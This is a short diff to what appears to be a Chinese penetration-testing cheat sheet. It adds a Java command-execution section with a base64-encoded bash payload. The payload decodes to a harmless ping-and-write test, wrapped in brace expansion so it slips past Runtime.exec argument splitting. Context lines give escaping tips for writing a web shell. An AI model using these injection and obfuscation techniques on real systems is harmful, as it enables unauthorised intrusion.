@@ -60,6 +60,13 @@ Table of Contents
     - [植入后门](#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8)
 - [cs大全](#cs%E5%A4%A7%E5%85%A8)
 
+# java命令执行
+http://www.jackson-t.ca/runtime-exec-payloads.html
+```
+bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}
+```
+
+
 ## 写shell
 在windows中，批处理需要转义字符主要有 “&”，“|”，“<”，“>”等等，转义字符为”^”
 在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。
